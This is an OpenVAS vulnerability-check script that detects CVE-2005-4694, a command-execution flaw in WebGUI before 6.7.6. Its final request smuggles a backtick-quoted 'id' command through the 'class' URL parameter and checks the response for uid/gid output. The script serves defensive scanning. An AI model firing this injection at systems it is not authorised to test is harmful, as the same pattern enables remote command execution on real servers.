# OpenVAS Vulnerability Test
# $Id: webgui_remote_cmd_exec.nasl 6056 2017-05-02 09:02:50Z teissa $
# Description: WebGUI < 6.7.6 arbitrary command execution
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2005 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if (description) {
script_id(20014);
script_version("$Revision: 6056 $");
script_tag(name:"last_modification", value:"$Date: 2017-05-02 11:02:50 +0200 (Tue, 02 May 2017) $");
script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
script_cve_id("CVE-2005-4694");
script_bugtraq_id(15083);
script_xref(name:"OSVDB", value:"19933");

script_name("WebGUI < 6.7.6 arbitrary command execution");

script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
script_family("Web application abuses");

script_copyright("This script is Copyright (C) 2005 David Maciejak");

script_dependencies("http_version.nasl");
script_exclude_keys("Settings/disable_cgi_scanning");
script_require_ports("Services/www", 80);

script_tag(name:"solution" , value:"Upgrade to WebGUI 6.7.6 or later.");
script_tag(name:"summary" , value:"The remote web server contains a CGI script that is prone to arbitrary
code execution. 

Description :

The remote host is running WebGUI, a content management system from
Plain Black Software. 

The installed version of WebGUI on the remote host fails to sanitize
user-supplied input via the 'class' variable to various sources before
using it to run commands.  By leveraging this flaw, an attacker may be
able to execute arbitrary commands on the remote host within the
context of the affected web server userid.");
script_xref(name:"URL" , value:"http://www.plainblack.com/getwebgui/advisories/security-exploit-patch-for-6.3-and-above");
exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");


http_check_remote_code (
			check_request:"/index.pl/homels?func=add;class=WebGUI::Asset::Wobject::Article%3bprint%20%60id%60;",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			extra_check:'<meta name="generator" content="WebGUI 6',
			command:"id"
			);
